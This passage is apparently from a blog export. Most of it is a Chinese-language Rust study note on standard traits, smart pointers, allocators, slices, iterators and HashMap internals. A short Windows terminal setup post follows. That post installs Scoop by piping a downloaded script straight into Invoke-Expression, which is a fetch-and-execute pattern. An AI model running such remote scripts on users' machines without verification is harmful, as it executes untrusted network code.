Error&gt;;&#125;pub trait Display &#123; fn fmt(&amp;self, f: &amp;mut Formatter&lt;'_&gt;) -&gt; Result&lt;(), Error&gt;;&#125; 可以看到，Debug 和 Display 两个 trait 的签名一样，都接受一个 &amp;self 和一个 &amp;mut Formatter。 Debug 是为开发者调试打印数据结构所设计的，而 Display 是给用户显示数据结构所设计的。这也是为什么 Debug trait 的实现可以通过派生宏直接生成，而 Display 必须手工实现。在使用的时候，Debug 用 {:?} 来打印，Display 用 {} 打印。 最后看 Default trait。它的定义如下： 123pub trait Default &#123; fn default() -&gt; Self;&#125; Default trait 用于为类型提供缺省值。它也可以通过 derive 宏 #[derive(Default)] 来生成实现，前提是类型中的每个字段都实现了 Default trait。在初始化一个数据结构时，可以部分初始化，然后剩余的部分使用 Default::default()。 Debug/Display/Default 如何使用，统一看个例子（代码）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455use std::fmt;// struct 可以 derive Default，但需要所有字段都实现了 Default#[derive(Clone, Debug, Default)]struct Developer &#123; name: String, age: u8, lang: Language,&#125;// enum 不能 derive Default#[allow(dead_code)]#[derive(Clone, Debug)]enum Language &#123; Rust, TypeScript, Elixir, Haskell,&#125;// 手工实现 Defaultimpl Default for Language &#123; fn default() -&gt; Self &#123; Language::Rust &#125;&#125;impl Developer &#123; pub fn new(name: &amp;str) -&gt; Self &#123; // 用 ..Default::default() 为剩余字段使用缺省值 Self &#123; name: name.to_owned(), ..Default::default() &#125; &#125;&#125;impl fmt::Display for Developer &#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result &#123; write!( f, \"&#123;&#125;(&#123;&#125; years old): &#123;:?&#125; developer\", self.name, self.age, self.lang ) &#125;&#125;fn main() &#123; // 使用 T::default() let dev1 = Developer::default(); // 使用 Default::default()，但此时类型无法通过上下文推断，需要提供类型 let dev2: Developer = Default::default(); // 使用 T::new let dev3 = Developer::new(\"Tyr\"); println!(\"dev1: &#123;&#125;\\\\ndev2: &#123;&#125;\\\\ndev3: &#123;:?&#125;\", dev1, dev2, dev3);&#125; 在软件开发中，延迟绑定会带来极大的灵活性。 从数据的角度看，数据结构是具体数据的延迟绑定，泛型结构是具体数据结构的延迟绑定；从代码的角度看，函数是一组实现某个功能的表达式的延迟绑定，泛型函数是函数的延迟绑定。那么 trait 是什么的延迟绑定呢？ trait 是行为的延迟绑定。可以在不知道具体要处理什么数据结构的前提下，先通过 trait 把系统的很多行为约定好。这也是为什么开头解释标准trait时，频繁用到了“约定……行为”。 智能指针 指针是一个持有内存地址的值，可以通过解引用来访问它指向的内存地址，理论上可以解引用到任意数据类型；引用是一个特殊的指针，它的解引用访问是受限的，只能解引用到它引用数据的类型。 智能指针是一个表现行为很像指针的数据结构，但除了指向数据的指针外，它还有元数据以提供额外的处理能力。 在 Rust 中，凡是需要做资源回收的数据结构，且实现了 Deref/DerefMut/Drop，都是智能指针。 用于在堆上分配内存的 Box 和 Vec、用于引用计数的 Rc 和 Arc 。很多其他数据结构，如 PathBuf、Cow&lt;'a, B&gt;、MutexGuard、RwLockReadGuard 和 RwLockWriteGuard 等也是智能指针。 String 是用结构体定义的： 1234567891011121314151617181920212223242526272829pub struct String &#123; vec: Vec&lt;u8&gt;,&#125;impl ops::Deref for String &#123; type Target = str; fn deref(&amp;self) -&gt; &amp;str &#123; unsafe &#123; str::from_utf8_unchecked(&amp;self.vec) &#125; &#125;&#125;impl ops::DerefMut for String &#123; fn deref_mut(&amp;mut self) -&gt; &amp;mut str &#123; unsafe &#123; str::from_utf8_unchecked_mut(&amp;mut *self.vec) &#125; &#125;&#125;unsafe impl&lt;#[may_dangle] T, A: Allocator&gt; Drop for Vec&lt;T, A&gt; &#123; fn drop(&amp;mut self) &#123; unsafe &#123; // use drop for [T] // use a raw slice to refer to the elements of the vector as weakest necessary type; // could avoid questions of validity in certain cases ptr::drop_in_place(ptr::slice_from_raw_parts_mut(self.as_mut_ptr(), self.len)) &#125; // RawVec handles deallocation &#125;&#125; Box Rust 中最基本的在堆上分配内存的方式。 Box 的定义里，内部是一个 Unique 用于致敬 C++，Unique 是一个私有的数据结构，不能直接使用，它包裹了一个 *const T 指针，并唯一拥有这个指针。 123456789pub struct Unique&lt;T: ?Sized&gt; &#123; pointer: *const T, // NOTE: this marker has no consequences for variance, but is necessary // for dropck to understand that we logically own a `T`. // // For details, see: // https://github.com/rust-lang/rfcs/blob/master/text/0769-sound-generic-drop.md#phantom-data _marker: PhantomData&lt;T&gt;,&#125; 在堆上分配内存，需要使用内存分配器（Allocator）。设计内存分配器的目的除了保证正确性之外，就是为了有效地利用剩余内存，并控制内存在分配和释放过程中产生的碎片的数量。 堆上分配内存的 Box 其实有一个缺省的泛型参数 A，就需要满足 Allocator trait，并且默认是 Global： 1pub struct Box&lt;T: ?Sized,A: Allocator = Global&gt;(Unique&lt;T&gt;, A) Allocator trait 提供很多方法： allocate是主要方法，用于分配内存，对应 C 的 malloc/calloc； deallocate，用于释放内存，对应 C 的 free； 还有 grow / shrink，用来扩大或缩小堆上已分配的内存，对应 C 的 realloc。 替换默认的内存分配器，可以使用 #[global_allocator] 标记宏，定义你自己的全局分配器。下面的代码展示了如何在 Rust 下使用 jemalloc： 123456use jemallocator::Jemalloc;#[global_allocator]static GLOBAL: Jemalloc = Jemalloc;fn main() &#123;&#125; 这样设置之后，使用 Box::new() 分配的内存就是 jemalloc 分配出来的了。另外，撰写自己的全局分配器，可以实现 GlobalAlloc trait，它和 Allocator trait 的区别，主要在于是否允许分配长度为零的内存。 常见的通用内存分配器有 glibc 的 pthread malloc、Google 开发的 tcmalloc、FreeBSD 上默认使用的 jemalloc 等。除了通用内存分配器，对于特定类型内存的分配，还可以用 slab，slab 相当于一个预分配好的对象池，可以扩展和收缩。 示例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546use std::alloc::&#123;GlobalAlloc, Layout, System&#125;;struct MyAllocator;unsafe impl GlobalAlloc for MyAllocator &#123; unsafe fn alloc(&amp;self, layout: Layout) -&gt; *mut u8 &#123; let data = System.alloc(layout); eprintln!(\"ALLOC: &#123;:p&#125;, size &#123;&#125;\", data, layout.size()); data &#125; unsafe fn dealloc(&amp;self, ptr: *mut u8, layout: Layout) &#123; System.dealloc(ptr, layout); eprintln!(\"FREE: &#123;:p&#125;, size &#123;&#125;\", ptr, layout.size()); &#125;&#125;#[global_allocator]static GLOBAL: MyAllocator = MyAllocator;#[allow(dead_code)]struct Matrix &#123; // 使用不规则的数字如 505 可以让 dbg! 的打印很容易分辨出来 data: [u8; 505],&#125;impl Default for Matrix &#123; fn default() -&gt; Self &#123; Self &#123; data: [0; 505] &#125; &#125;&#125;fn main() &#123; // 在这句执行之前已经有好多内存分配 let data = Box::new(Matrix::default()); // 输出中有一个 1024 大小的内存分配，是 println! 导致的 println!( \"!!! allocated memory: &#123;:p&#125;, len: &#123;&#125;\", &amp;*data, std::mem::size_of::&lt;Matrix&gt;() ); // data 在这里 drop，可以在打印中看到 FREE // 之后还有很多其它内存被释放&#125; 注意这里不能使用 println!() 。因为 stdout 会打印到一个由 Mutex 互斥锁保护的共享全局 buffer 中，这个过程中会涉及内存的分配，再运行 println!()，最终造成程序崩溃。而 eprintln! 直接打印到 stderr，不会 buffer。 Box::new() 是一个函数，所以传入它的数据会出现在栈上，再移动到堆上。所以，如果的 Matrix 结构不是 505 个字节，是一个非常大的结构，就有可能出现 stack overflow 问题。 如果是 debug build，它不会做任何 inline 的优化，而 Box::new() 注明了要 inline，在 release 模式下，这个函数调用会被优化掉： 12345678#[cfg(not(no_global_oom_handling))]#[inline(always)]#[doc(alias = \"alloc\")]#[doc(alias = \"malloc\")]#[stable(feature = \"rust1\", since = \"1.0.0\")]pub fn new(x: T) -&gt; Self &#123; box x&#125; 如果不 inline，整个 16M 的大数组会通过栈内存传递给 Box::new，导致栈溢出。 Box 的内存释放实现： 123456#[stable(feature = \"rust1\", since = \"1.0.0\")]unsafe impl&lt;#[may_dangle] T: ?Sized, A: Allocator&gt; Drop for Box&lt;T, A&gt; &#123; fn drop(&amp;mut self) &#123; // FIXME: Do nothing, drop is currently performed by compiler. &#125;&#125; drop trait 什么都没有做，编译器会自动插入 deallocate 的代码。这是 Rust 语言的一种策略：在具体实现还没有稳定下来之前，先把接口稳定，实现随着之后的迭代慢慢稳定。 Cow&lt;'a, B&gt; Cow 是 Rust 下用于提供写时克隆（Clone-on-Write）的一个智能指针，有一个只读借用，但如果调用者需要所有权或者需要修改内容，那么它会 clone 借用的数据。 1234pub enum Cow&lt;'a, B&gt; where B: 'a + ToOwned + ?Sized &#123; Borrowed(&amp;'a B), Owned(&lt;B as ToOwned&gt;::Owned),&#125; 它是一个 enum，可以包含一个对类型 B 的只读引用，或者包含对类型 B 的拥有所有权的数据。 这里又引入了两个 trait，首先是 ToOwned，在 ToOwned trait 定义的时候，又引入了 Borrow trait，它们都是 std::borrow 下的 trait： 12345678910111213141516171819202122pub trait ToOwned &#123; type Owned: Borrow&lt;Self&gt;; #[must_use = \"cloning is often expensive and is not expected to have side effects\"] fn to_owned(&amp;self) -&gt; Self::Owned; fn clone_into(&amp;self, target: &amp;mut Self::Owned) &#123; ... &#125;&#125;pub trait Borrow&lt;Borrowed&gt; where Borrowed: ?Sized &#123; fn borrow(&amp;self) -&gt; &amp;Borrowed;&#125;impl&lt;B: ?Sized + ToOwned&gt; Deref for Cow&lt;'_, B&gt; &#123; type Target = B; fn deref(&amp;self) -&gt; &amp;B &#123; match *self &#123; Borrowed(borrowed) =&gt; borrowed, Owned(ref owned) =&gt; owned.borrow(), &#125; &#125;&#125; 根据 self 是 Borrowed 还是 Owned，分别取其内容，生成引用： 对于 Borrowed，直接就是引用； 对于 Owned，调用其 borrow() 方法，获得引用。 根据 enum 的不同状态来进行统一分发的方法是第三种分发手段，对应的有使用泛型参数做静态分发和使用 trait object 做动态分发。 相对于栈内存的分配释放来说，堆内存的分配和释放效率要低很多，其内部还涉及系统调用和锁，减少不必要的堆内存分配是提升系统效率的关键手段。而 Rust 的 Cow&lt;'a, B&gt;，在帮助你达成这个效果的同时，使用体验还非常简单舒服。 使用示例 在解析 URL 的时候，需要将 querystring 中的参数，提取成 KV pair 来进一步使用。绝大多数语言中，提取出来的 KV 都是新的字符串，在每秒钟处理几十 k 甚至上百 k 请求的系统中，堆内存的分配会很频繁。 但在 Rust 中，可以用 Cow 类型轻松高效处理它，在读取 URL 的过程中： 每解析出一个 key 或者 value，可以用一个 &amp;str 指向 URL 中相应的位置，然后用 Cow 封装它； 而当解析出来的内容不能直接使用，需要 decode 时，比如 “hello%20world”，可以生成一个解析后的 String，同样用 Cow 封装它。 1234567891011121314151617181920212223242526272829303132333435use std::borrow::Cow;use url::Url;fn main() &#123; let url = Url::parse(\"https://tyr.com/rust?page=1024&amp;sort=desc&amp;extra=hello%20world\").unwrap(); let mut pairs = url.query_pairs(); assert_eq!(pairs.count(), 3); let (mut k, v) = pairs.next().unwrap(); // 因为 k, v 都是 Cow&lt;str&gt; 他们用起来感觉和 &amp;str 或者 String 一样 // 此刻，他们都是 Borrowed println!(\"key: &#123;&#125;, v: &#123;&#125;\", k, v); // 当修改发生时，k 变成 Owned k.to_mut().push_str(\"_lala\"); print_pairs((k, v)); print_pairs(pairs.next().unwrap()); // 在处理 extra=hello%20world 时，value 被处理成 \"hello world\" // 所以这里 value 是 Owned print_pairs(pairs.next().unwrap());&#125;fn print_pairs(pair: (Cow&lt;str&gt;, Cow&lt;str&gt;)) &#123; println!(\"key: &#123;&#125;, value: &#123;&#125;\", show_cow(pair.0), show_cow(pair.1));&#125;fn show_cow(cow: Cow&lt;str&gt;) -&gt; String &#123; match cow &#123; Cow::Borrowed(v) =&gt; format!(\"Borrowed &#123;&#125;\", v), Cow::Owned(v) =&gt; format!(\"Owned &#123;&#125;\", v), &#125;&#125; 在 Rust 标准库和第三方库中非常常见。比如 Rust 下著名的 serde 库，可以非常高效地对 Rust 数据结构，进行序列化/反序列化操作，它对 Cow 就有很好的支持。 我们可以通过如下代码将一个 JSON 数据反序列化成 User 类型，同时让 User 中的 name 使用 Cow 来引用 JSON 文本中的内容： 12345678910111213141516171819use std::borrow::Cow;use serde::Deserialize;#[derive(Debug, Deserialize)]struct User&lt;'input&gt; &#123; #[serde(borrow)] name: Cow&lt;'input, str&gt;, age: u8,&#125;fn main() &#123; let input = r#\"&#123; \"name\": \"Tyr\", \"age\": 18 &#125;\"#; let user: User = serde_json::from_str(input).unwrap(); match user.name &#123; Cow::Borrowed(x) =&gt; println!(\"borrowed &#123;&#125;\", x), Cow::Owned(x) =&gt; println!(\"owned &#123;&#125;\", x), &#125;&#125; MutexGuard MutexGuard 不但通过 Deref 提供良好的用户体验，还通过 Drop trait 来确保，使用到的内存以外的资源在退出时进行释放。 MutexGuard 这个结构是在调用 Mutex::lock 时生成的： 123456pub fn lock(&amp;self) -&gt; LockResult&lt;MutexGuard&lt;'_, T&gt;&gt; &#123; unsafe &#123; self.inner.raw_lock(); MutexGuard::new(self) &#125;&#125; 首先，它会取得锁资源，如果拿不到，会在这里等待；如果拿到了，会把 Mutex 结构的引用传递给 MutexGuard。 123456789101112131415161718192021222324252627282930// 这里用 must_use，当你得到了却不使用 MutexGuard 时会报警#[must_use = \"if unused the Mutex will immediately unlock\"]pub struct MutexGuard&lt;'a, T: ?Sized + 'a&gt; &#123; lock: &amp;'a Mutex&lt;T&gt;, poison: poison::Guard,&#125;impl&lt;T: ?Sized&gt; Deref for MutexGuard&lt;'_, T&gt; &#123; type Target = T; fn deref(&amp;self) -&gt; &amp;T &#123; unsafe &#123; &amp;*self.lock.data.get() &#125; &#125;&#125;impl&lt;T: ?Sized&gt; DerefMut for MutexGuard&lt;'_, T&gt; &#123; fn deref_mut(&amp;mut self) -&gt; &amp;mut T &#123; unsafe &#123; &amp;mut *self.lock.data.get() &#125; &#125;&#125;impl&lt;T: ?Sized&gt; Drop for MutexGuard&lt;'_, T&gt; &#123; #[inline] fn drop(&amp;mut self) &#123; unsafe &#123; self.lock.poison.done(&amp;self.poison); self.lock.inner.raw_unlock(); &#125; &#125;&#125; 使用示例 12345678910111213141516171819202122232425262728293031323334353637use lazy_static::lazy_static;use std::borrow::Cow;use std::collections::HashMap;use std::sync::&#123;Arc, Mutex&#125;;use std::thread;use std::time::Duration;// lazy_static 宏可以生成复杂的 static 对象lazy_static! &#123; // 一般情况下 Mutex 和 Arc 一起在多线程环境下提供对共享内存的使用 // 如果你把 Mutex 声明成 static，其生命周期是静态的，不需要 Arc static ref METRICS: Mutex&lt;HashMap&lt;Cow&lt;'static, str&gt;, usize&gt;&gt; = Mutex::new(HashMap::new());&#125;fn main() &#123; // 用 Arc 来提供并发环境下的共享所有权（使用引用计数） let metrics: Arc&lt;Mutex&lt;HashMap&lt;Cow&lt;'static, str&gt;, usize&gt;&gt;&gt; = Arc::new(Mutex::new(HashMap::new())); for _ in 0..32 &#123; let m = metrics.clone(); thread::spawn(move || &#123; let mut g = m.lock().unwrap(); // 此时只有拿到 MutexGuard 的线程可以访问 HashMap let data = &amp;mut *g; // Cow 实现了很多数据结构的 From trait， // 所以我们可以用 \"hello\".into() 生成 Cow let entry = data.entry(\"hello\".into()).or_insert(0); *entry += 1; // MutexGuard 被 Drop，锁被释放 &#125;); &#125; thread::sleep(Duration::from_millis(100)); println!(\"metrics: &#123;:?&#125;\", metrics.lock().unwrap());&#125; MutexGuard 不允许 Send，只允许 Sync，也就是说，你可以把 MutexGuard 的引用传给另一个线程使用，但你无法把 MutexGuard 整个移动到另一个线程： 12impl&lt;T: ?Sized&gt; !Send for MutexGuard&lt;'_, T&gt; &#123;&#125;unsafe impl&lt;T: ?Sized + Sync&gt; Sync for MutexGuard&lt;'_, T&gt; &#123;&#125; 类似 MutexGuard 的智能指针有很多用途。比如要创建一个连接池，可以在 Drop trait 中，回收 checkout 出来的连接，将其再放回连接池。 数据库连接池实现：r2d2 优化 String Rust 下 String 在栈上占了 24 个字节，然后在堆上存放字符串实际的内容，对于一些比较短的字符串，这很浪费内存。 用一个 enum 来处理：当字符串小于 N 字节时，我们直接用栈上的数组，否则，使用 String。但是这个 N 不宜太大，否则当使用 String 时，会比目前的版本浪费内存。 当使用 enum 时，额外的 tag + 为了对齐而使用的 padding 会占用一些内存。因为 String 结构是 8 字节对齐的，我们的 enum 最小 8 + 24 = 32 个字节。 设计一个数据结构，内部用一个字节表示字符串的长度，用 30 个字节表示字符串内容，再加上 1 个字节的 tag，正好也是 32 字节，可以和 String 放在一个 enum 里使用。 通过实现 Deref trait 让 MyString 可以被解引用成 &amp;str。除此之外，还可以实现 Debug/Display 和 From trait，让 MyString 使用起来更方便。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103use std::&#123;fmt, ops::Deref, str&#125;;const MINI_STRING_MAX_LEN: usize = 30;// MyString 里，String 有 3 个 word，供 24 字节，所以它以 8 字节对齐// 所以 enum 的 tag + padding 最少 8 字节，整个结构占 32 字节。// MiniString 可以最多有 30 字节（再加上 1 字节长度和 1字节 tag），就是 32 字节.struct MiniString &#123; len: u8, data: [u8; MINI_STRING_MAX_LEN],&#125;impl MiniString &#123; // 这里 new 接口不暴露出去，保证传入的 v 的字节长度小于等于 30 fn new(v: impl AsRef&lt;str&gt;) -&gt; Self &#123; let bytes = v.as_ref().as_bytes(); // 我们在拷贝内容时一定要使用字符串的字节长度 let len = bytes.len(); let mut data = [0u8; MINI_STRING_MAX_LEN]; data[..len].copy_from_slice(bytes); Self &#123; len: len as u8, data, &#125; &#125;&#125;impl Deref for MiniString &#123; type Target = str; fn deref(&amp;self) -&gt; &amp;Self::Target &#123; // 由于生成 MiniString 的接口是隐藏的，它只能来自字符串，所以下面这行是安全的 str::from_utf8(&amp;self.data[..self.len as usize]).unwrap() // 也可以直接用 unsafe 版本 // unsafe &#123; str::from_utf8_unchecked(&amp;self.data[..self.len as usize]) &#125; &#125;&#125;impl fmt::Debug for MiniString &#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result &#123; // 这里由于实现了 Deref trait，可以直接得到一个 &amp;str 输出 write!(f, \"&#123;&#125;\", self.deref()) &#125;&#125;#[derive(Debug)]enum MyString &#123; Inline(MiniString), Standard(String),&#125;// 实现 Deref 接口对两种不同的场景统一得到 &amp;strimpl Deref for MyString &#123; type Target = str; fn deref(&amp;self) -&gt; &amp;Self::Target &#123; match *self &#123; MyString::Inline(ref v) =&gt; v.deref(), MyString::Standard(ref v) =&gt; v.deref(), &#125; &#125;&#125;impl From&lt;&amp;str&gt; for MyString &#123; fn from(s: &amp;str) -&gt; Self &#123; match s.len() &gt; MINI_STRING_MAX_LEN &#123; true =&gt; Self::Standard(s.to_owned()), _ =&gt; Self::Inline(MiniString::new(s)), &#125; &#125;&#125;impl fmt::Display for MyString &#123; fn fmt(&amp;self, f: &amp;mut fmt::Formatter&lt;'_&gt;) -&gt; fmt::Result &#123; write!(f, \"&#123;&#125;\", self.deref()) &#125;&#125;fn main() &#123; let len1 = std::mem::size_of::&lt;MyString&gt;(); let len2 = std::mem::size_of::&lt;MiniString&gt;(); println!(\"Len: MyString &#123;&#125;, MiniString &#123;&#125;\", len1, len2); let s1: MyString = \"hello world\".into(); let s2: MyString = \"这是一个超过了三十个字节的很长很长的字符串\".into(); // debug 输出 println!(\"s1: &#123;:?&#125;, s2: &#123;:?&#125;\", s1, s2); // display 输出 println!( \"s1: &#123;&#125;(&#123;&#125; bytes, &#123;&#125; chars), s2: &#123;&#125;(&#123;&#125; bytes, &#123;&#125; chars)\", s1, s1.len(), s1.chars().count(), s2, s2.len(), s2.chars().count() ); // MyString 可以使用一切 &amp;str 接口，感谢 Rust 的自动 Deref assert!(s1.ends_with(\"world\")); assert!(s2.starts_with(\"这\"));&#125; 这个简单实现的 MyString，不管它内部的数据是纯栈上的 MiniString 版本，还是包含堆上内存的 String 版本，使用的体验和 &amp;str 都一致，仅仅牺牲了一点点效率和内存，就可以让小容量的字符串，可以高效地存储在栈上并且自如地使用。 Rust 有个叫 smartstring 的第三方库就实现并优化了这个功能。 集合容器 切片 在 Rust 里，切片是描述一组属于同一类型、长度不确定的、在内存中连续存放的数据结构，用 [T] 来表述。因为长度不确定，所以切片是个 DST（Dynamically Sized Type）。 切片一般只出现在数据结构的定义中，不能直接访问，在使用中主要用以下形式： &amp;[T]：表示一个只读的切片引用。 &amp;mut [T]：表示一个可写的切片引用。 Box&lt;[T]&gt;：一个在堆上分配的切片。 通过解引用，数据结构可以获得切片的所有能力，包括：binary_search、chunks、concat、contains、start_with、end_with、group_by、iter、join、sort、split、swap 等。 当构建自己的数据结构时，如果它内部也有连续排列的等长的数据结构，可以考虑 AsRef 或者 Deref 到切片。 切片的对象可以在堆上，也可以在栈上，并且其内容可以相互比较。 切片是集合数据的视图，而迭代器定义了对集合数据的各种各样的访问操作。 大多数情况下，我们只需要定义它的关联类型 Item 和 next() 方法。 Item 定义了每次我们从迭代器中取出的数据类型； next() 是从迭代器里取下一个值的方法。 123456789#[must_use = \"iterators are lazy and do nothing unless consumed\"]pub trait Iterator &#123; type Item; fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt;; // 大量缺省的方法，包括 size_hint, count, chain, zip, map, // filter, for_each, skip, take_while, flat_map, flatten // collect, partition 等 ... &#125; 对 Vec 使用 iter() 方法，并进行各种 map / filter / take 操作。 1234567891011fn main() &#123; // 这里 Vec&lt;T&gt; 在调用 iter() 时被解引用成 &amp;[T]，所以可以访问 iter() let result = vec![1, 2, 3, 4] .iter() .map(|v| v * v) .filter(|v| *v &lt; 16) .take(1) .collect::&lt;Vec&lt;_&gt;&gt;(); println!(\"&#123;:?&#125;\", result);&#125; 需要注意的是 Rust 下的迭代器是个懒接口（lazy interface），也就是说这段代码直到运行到 collect 时才真正开始执行，之前的部分不过是在不断地生成新的结构，来累积处理逻辑而已。 Rust 大量使用了 inline 等优化技巧，函数式编程优化后，性能和 C 语言的 for 循环差别不大。 itertools，是和 Python 下 itertools 同名且功能类似的工具，提供了大量额外的 adapter。 1234567891011use itertools::Itertools;fn main() &#123; let err_str = \"bad happened\"; let input = vec![Ok(21), Err(err_str), Ok(7)]; let it = input .into_iter() .filter_map_ok(|i| if i &gt; 10 &#123; Some(i * 2) &#125; else &#123; None &#125;); // 结果应该是：vec![Ok(42), Err(err_str)] println!(\"&#123;:?&#125;\", it.collect::&lt;Vec&lt;_&gt;&gt;());&#125; 在实际开发中，我们可能从一组 Future 中汇聚出一组结果，里面有成功执行的结果，也有失败的错误信息。用 itertools 里的 filter_map_ok()，进一步做 filter/map。 String 是一个特殊的 Vec，所以在 String 上做切片，也是一个特殊的结构 &amp;str。String 在解引用时，会转换成 &amp;str。 Box&lt;[T]&gt; Box&lt;[T]&gt; 和 Vec 有一点点差别：Vec 有额外的 capacity，可以增长；而 Box&lt;[T]&gt; 一旦生成就固定下来，没有 capacity，也无法增长。 Box&lt;[T]&gt;和切片的引用&amp;[T] 也很类似：它们都是在栈上有一个包含长度的胖指针，指向存储数据的内存位置。区别是：Box&lt;[T]&gt; 只会指向堆，&amp;[T] 指向的位置可以是栈也可以是堆；此外，Box&lt;[T]&gt; 对数据具有所有权，而 &amp;[T] 只是一个借用。 那么如何产生 Box&lt;[T]&gt; 呢？目前可用的接口就只有一个：从已有的 Vec 中转换。 1234567891011121314// 从 Vec&lt;T&gt; 转换成 Box&lt;[T]&gt;，此时会丢弃多余的 capacitylet b1 = v1.into_boxed_slice();// Box&lt;[T]&gt; 也可以通过 into_vec() 转换回 Vec&lt;T&gt;// Box&lt;[T]&gt; 可以更改其内部数据，但无法 pushb2[0] = 2;// b2.push(6);// 注意 Box&lt;[T]&gt; 和 Box&lt;[T; n]&gt; 并不相同let b3 = Box::new([2, 2, 3, 4, 5]);// b2 和 b3 相等，但 b3.deref() 和 v2 无法比较assert!(b2 == b3);// assert!(b3.deref() == v2); into_boxed_slice 和 into_vec 两个转换都是很轻量的转换，只是变换一下结构，不涉及数据的拷贝。区别是，当 Vec 转换成 Box&lt;[T]&gt; 时，没有使用到的容量就会被丢弃，所以整体占用的内存可能会降低。 Box&lt;[T]&gt; 有一个很好的特性是，不像 Box&lt;[T;n]&gt; 那样在编译时就要确定大小，它可以在运行期生成，以后大小不会再改变。 所以，需要在堆上创建固定大小的集合数据，且不希望自动增长，那么，可以先创建 Vec，再转换成 Box&lt;[T]&gt;。tokio 在提供 broadcast channel 时，就使用了 Box&lt;[T]&gt; 这个特性。 哈希表 哈希冲突解决：链地址法（chaining）和开放寻址法（open addressing）。Rust 使用 开放寻址法 + 二次探查（开放寻址法把整个哈希表看做一个大数组，不引入额外的内存，在冲突发生时，不断探寻哈希位置加减 n 的二次方，找到空闲的位置插入）。 链地址法缺点是哈希表和冲突链使用了不同的内存，对缓存不友好。 标准库的 源代码： 1234567891011use hashbrown::hash_map as base;#[derive(Clone)]pub struct RandomState &#123; k0: u64, k1: u64,&#125;pub struct HashMap&lt;K, V, S = RandomState&gt; &#123; base: base::HashMap&lt;K, V, S&gt;,&#125; HashMap 有三个泛型参数，K 和 V 代表 key / value 的类型，S 是哈希算法的状态，它默认是 RandomState，占两个 u64。RandomState 使用 SipHash 作为缺省的哈希算法，一个加密安全的哈希函数（cryptographically secure hashing）。 Rust 的 HashMap 复用了 hashbrown 的 HashMap。hashbrown 是 Rust 下对 Google Swiss Table 的一个改进版实现： 1234pub struct HashMap&lt;K, V, S = DefaultHashBuilder, A: Allocator + Clone = Global&gt; &#123; pub(crate) hash_builder: S, pub(crate) table: RawTable&lt;(K, V), A&gt;,&#125; 可以看到，HashMap 里有两个域，一个是 hash_builder，类型是标准库使用的 RandomState，还有一个是具体的 RawTable： 12345678910111213141516171819202122232425pub struct RawTable&lt;T, A: Allocator + Clone = Global&gt; &#123; table: RawTableInner&lt;A&gt;, // Tell dropck that we own instances of T. marker: PhantomData&lt;T&gt;,&#125;struct RawTableInner&lt;A&gt; &#123; // Mask to get an index from a hash value. The value is one less than the // number of buckets in the table. bucket_mask: usize, // [Padding], T1, T2, ..., Tlast, C1, C2, ... // ^ points here // 指向哈希表堆内存末端的 ctrl 区 ctrl: NonNull&lt;u8&gt;, // Number of elements that can be inserted before we need to grow the table growth_left: usize, // Number of elements in the table, only really used by len() items: usize, // 和 RawTable 的 marker 一样，只是一个用来占位的类型 alloc: A,&#125; HashMap 内存布局 ctrl 是一个指向哈希表堆地址末端 ctrl 区的地址。每个 bucket 大小是 key（char） + value（i32） 的大小，也就是 8 个字节。以此可以计算出哈希表的起始地址。 可用的调试工具：rust-gdb，rust-lldb 内存布局分为栈和堆两部分： 栈：RandomState(2*u64) | mask | ctrl ptr | growth_left | items 堆：(ctrl ptr) 指向 ctrl 表 | (key, value) | (key, value) ctrl 表用于快速查找，由 16 字节大小的 control byte 组成，每个 byte 对应一个 bucket，每个 bucket 对应一个 (key, value) 对。 16 字节大小的 control byte 可以用 SIMD 指令快速读取到缓存中。 当 HashMap 插入和删除数据，导致重新分配的时候，主要工作就是在维护 ctrl 表和数据的对应。 当要在哈希表中删除一个值时，先要找到要被删除的 key 所在的位置。在找到具体位置后，并不需要实际清除内存，只需要将它的 ctrl byte 设回 0xff。 当 key/value 有额外的内存时，比如 String，它的内存不会立即回收，只有在下一次对应的 bucket 被使用时，让 HashMap 不再拥有这个 String 的所有权之后，这个 String 的内存才被回收。 所以，如果在 HashMap 中，添加大量内容，又删除大量内容，这时，最好使用 shrink_to_fit / shrink_to 释放不需要的内存占用。 如果需要自定义 Hash Key，只需要定义三个 Trait：Hash、PartialEq、Eq。 HashSet / BTreeMap / BTreeSet HashSet 用于简单确认元素是否在集合中。 BTreeMap 和 BTreeSet 是内部使用 B-tree 来组织哈希表的数据结构，用来存放有序集合。 BTreeMap 的 key，需要实现 PartialOrd 和 Ord Trait。 SipHash SipHash 就是为了回应 DoS 攻击而创建的哈希算法，虽然和 sha2 这样的加密哈希不同（不要将 SipHash 用于加密！），但它可以提供更好的安全性。把 SipHash 作为 HashMap 的缺省的哈希算法，Rust 可以避免开发者在不知情的情况下被 DoS。 这一切的代价是性能损耗，虽然 SipHash 非常快，但比 hashbrown 使用的 Ahash 慢了不少。如果不需要 DoS 防护（比如一个完全内部使用的 HashMap），那么可以用 Ahash 来替换。使用 Ahash 提供的 RandomState 即可： 12345use ahash::&#123;AHasher, RandomState&#125;;use std::collections::HashMap;let mut map: HashMap&lt;char, i32, RandomState&gt; = HashMap::default();map.insert('a', 1);","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"Rust","slug":"Notes/Rust","permalink":"https://racleray.github.io/categories/Notes/Rust/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"https://racleray.github.io/tags/Rust/"}],"author":"HeRui"},{"title":"Windows终端配置","slug":"Windows终端配置","date":"2024-03-18T14:42:15.000Z","updated":"2024-03-18T14:59:27.880Z","comments":true,"path":"posts/a61fc9c9.html","link":"","permalink":"https://racleray.github.io/posts/a61fc9c9.html","excerpt":"windows 配置 wezterm 终端环境记录（archive）","text":"环境: Windows 10 scoop (optional) Scoop 12Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUserInvoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression 管理员权限下安装 1iex \"&amp; &#123;$(irm get.scoop.sh)&#125; -RunAsAdmin\" neovim 安装 1scoop install neovim wezterm 下载安装 配置： KevinSilvester/wezterm-config QianSong1/wezterm-config 配置文件目录：C:\\Users\\[your user name]\\.config\\wezterm 主题： catppuccin 快捷键导出： 1echo $(wezterm show-keys) &gt;&gt; 